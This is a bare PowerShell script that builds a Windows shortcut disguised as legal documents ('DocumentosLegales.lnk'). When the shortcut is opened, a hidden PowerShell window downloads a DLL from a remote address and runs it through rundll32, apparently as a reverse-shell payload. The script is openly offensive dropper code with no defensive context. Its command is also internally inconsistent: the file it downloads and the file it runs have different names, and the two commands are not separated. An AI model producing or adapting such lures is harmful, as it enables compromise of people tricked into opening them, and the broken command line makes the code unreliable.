$WshShell = New-Object -ComObject WScript.Shell
$Shortcut = $WshShell.CreateShortcut((Join-Path -Path (Get-Location) -ChildPath "DocumentosLegales.lnk"))
$Shortcut.TargetPath = "powershell.exe"
$Shortcut.Arguments = "-WindowStyle Hidden -Command `"iwr http://192.168.1.201/uxlib.dll -OutFile $env:TEMP\uxlib.dll Start-Process rundll32.exe $env:TEMP\rev.dll,Export`""
$Shortcut.IconLocation = "C:\Windows\System32\shell32.dll,1"
$Shortcut.Save()
